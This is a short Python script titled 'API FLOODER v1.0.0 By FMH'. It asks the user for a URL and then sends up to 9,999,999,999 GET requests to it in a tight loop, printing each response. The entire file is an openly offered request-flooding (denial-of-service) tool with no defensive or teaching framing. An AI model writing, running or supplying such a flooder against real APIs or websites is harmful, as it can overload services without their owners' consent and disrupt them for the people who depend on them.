import random
import time
import requests

print('''

API FLOODER
===========
v1.0.0 By FMH

''')

link = input("Enter The Full Link : ")
wwe = requests.get(f"{link}")
print(f"DATA : {wwe.text}")
h = int("9999999999")
time.sleep(3)
for i in range(h):
  resp = requests.get(f"{link}")
  print(f"SENT {i} - {link} - {resp}")
